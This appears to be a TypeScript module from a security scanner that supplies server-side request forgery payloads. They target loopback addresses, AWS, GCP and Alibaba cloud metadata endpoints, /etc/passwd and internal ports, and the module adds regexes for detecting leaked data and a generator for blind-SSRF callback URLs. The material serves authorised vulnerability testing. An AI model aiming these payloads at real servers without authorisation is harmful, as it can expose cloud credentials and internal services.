import { randomUUID } from 'node:crypto';

export const SSRF_PAYLOADS = [
  'http://127.0.0.1',
  'http://localhost',
  'http://[::1]',
  'http://0.0.0.0',
  'http://169.254.169.254/latest/meta-data/',   // AWS metadata
  'http://metadata.google.internal/',            // GCP metadata
  'http://100.100.100.200/latest/meta-data/',    // Alibaba metadata
  'file:///etc/passwd',
  'http://127.0.0.1:22',                        // port scan
  'http://127.0.0.1:3000',                      // internal services
];

export const SSRF_PARAM_PATTERNS = /[?&](url|link|src|image|proxy|callback|fetch|load|uri|href|path|file|resource|target|site|page|data)=/i;

export const SSRF_INDICATORS = [
  /root:.*:0:0/,                  // /etc/passwd content
  /ami-id/i,                      // AWS metadata
  /instance-id/i,                 // Cloud metadata
  /meta-data/i,                   // Generic metadata
  /Connection refused/i,          // Internal port scan evidence
  /ECONNREFUSED/,                 // Node.js connection refused
  /No route to host/i,
  /EHOSTUNREACH/,                 // Node.js host unreachable
  /Could not fetch.*127\.0\.0\.1/i,  // Server-side fetch error for loopback
  /Could not fetch.*localhost/i,     // Server-side fetch error for localhost
  /Could not fetch.*\[::1\]/i,      // Server-side fetch error for IPv6 loopback
];

/**
 * Generate callback-based SSRF payloads for blind SSRF detection.
 * Each payload gets a unique ID so the user can correlate hits on their
 * callback server (Burp Collaborator, interactsh, etc.) with injected payloads.
 */
export function generateCallbackPayloads(callbackUrl: string): string[] {
  // Normalize: strip trailing slash
  const base = callbackUrl.replace(/\/+$/, '');

  return [
    // Plain callback URL with unique path
    `${base}/ssrf-${randomUUID()}`,
    // Callback with a nested path to test path handling
    `${base}/ssrf-${randomUUID()}/probe`,
    // URL-encoded variant
    encodeURI(`${base}/ssrf-${randomUUID()}`),
    // With explicit port 80 (tests port normalization bypass)
    `${base}:80/ssrf-${randomUUID()}`,
    // With explicit port 443
    `${base}:443/ssrf-${randomUUID()}`,
  ];
}

/**
 * Get all SSRF payloads, optionally including callback-based payloads
 * for blind SSRF detection.
 */
export function getSSRFPayloads(callbackUrl?: string): string[] {
  if (!callbackUrl) {
    return [...SSRF_PAYLOADS];
  }
  return [...SSRF_PAYLOADS, ...generateCallbackPayloads(callbackUrl)];
}
